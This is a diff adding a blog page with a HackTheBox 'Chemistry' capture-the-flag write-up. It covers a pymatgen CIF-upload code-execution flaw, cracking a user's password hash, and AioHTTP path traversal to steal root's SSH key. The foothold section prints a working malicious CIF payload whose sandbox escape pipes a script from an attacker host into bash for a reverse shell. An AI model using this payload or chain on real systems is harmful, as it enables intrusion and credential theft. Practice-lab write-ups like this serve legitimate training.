@@ -1,0 +1,233 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="http://localhost:1337/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="http://localhost:1337/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="http://localhost:1337/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Foothold The target site allows to upload some cif files used by the pymatgen python library in order to perform some mathematical stuff. Older versions of this library suffer of a RCE vulnerability, as explained here Following the payload used to obtain a reverse shell: POST /upload HTTP/1.1 …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="CTF: HackTheBox Chemistry"/>
+  <meta property="og:description" content="Foothold The target site allows to upload some cif files used by the pymatgen python library in order to perform some mathematical stuff. Older versions of this library suffer of a RCE vulnerability, as explained here Following the payload used to obtain a reverse shell: POST /upload HTTP/1.1 …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="http://localhost:1337/ctf/htb/chemistry.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2024-12-08 18:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
+  <meta property="article:section" content="CTF"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; CTF: HackTheBox Chemistry</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="http://localhost:1337/">
+      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="http://localhost:1337/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="http://localhost:1337/">Home</a>
+
+  <a href="/categories.html">Categories</a>
+  <a href="/category/cheatsheet.html">Cheatsheets</a>
+  <a href="/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="ctf/htb/chemistry">CTF: HackTheBox Chemistry</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#foothold" title="Foothold">Foothold</a></li><li><a class="toc-href" href="#lateral-movement" title="Lateral Movement">Lateral Movement</a></li><li><a class="toc-href" href="#privilege-escalation" title="Privilege Escalation">Privilege Escalation</a></li></ul></div>
+        </div>
+    <h2 id="foothold">Foothold</h2>
+<p>The target site allows to upload  some <code>cif</code> files used by the <code>pymatgen</code> python library in order to perform some mathematical stuff.
+Older versions of this library suffer of a RCE vulnerability, as explained <a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-**qj2f**">here</a></p>
+<p>Following the payload used to obtain a reverse shell:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/upload</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">&lt;target ip&gt;:5000</span>
+<span class="err">...</span>
+
+-----------------------------21404693862339990737828555544
+Content-Disposition: form-data; name="file"; filename="exploit.cif"
+Content-Type: application/vnd.multiad.creator.cif
+
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl http://&lt;attacker ip&gt;:8000/shell | /bin/bash");0,0,0'
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "
+
+-----------------------------21404693862339990737828555544--
+</code></pre></div>
+<h2 id="lateral-movement">Lateral Movement</h2>
+<p>The application uses a sqlite database containing some users with password hashes:</p>
+<ul>
+<li>User <code>rosa</code> password hash is: <code>63ed86ee9f624c7b14f1d4f43dc251a5</code> </li>
+</ul>
+<p>With the use of rainbows table, is possible to easily crack the hash: <code>unicorniosrosados</code></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>There's another web application listening on port <code>127.0.0.1:8080</code>. After opening an ssh tunnel, this application presents as an analytics dashboard. There's nothing too interesting in it except the fact the it's served by python's library <strong>AioHTTP 3.9.1</strong>. 
+This library (versions =&lt; 3.9.1) are affected by CVE-2024-23334; this CVE allows to perform path traversal.</p>
+<ul>
+<li>Using <a href="https://github.com/z3rObyte/CVE-2024-23334-PoC">this exploit</a>*, it's possible to exfiltrate root's ssh private key at <code>/root/.ssh/id_rsa</code> and logon as root.</li>
+</ul>
+<p>*Note: the exploit needs an existing static folder in order to work. The <code>/static/</code> folder from the original script has been replaced with the <code>/assets/</code> folder which actually exists on the target application.</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "http://localhost:1337",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
+      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="http://localhost:1337/theme/stork/stork.js"></script>
+
+</body>
+</html>
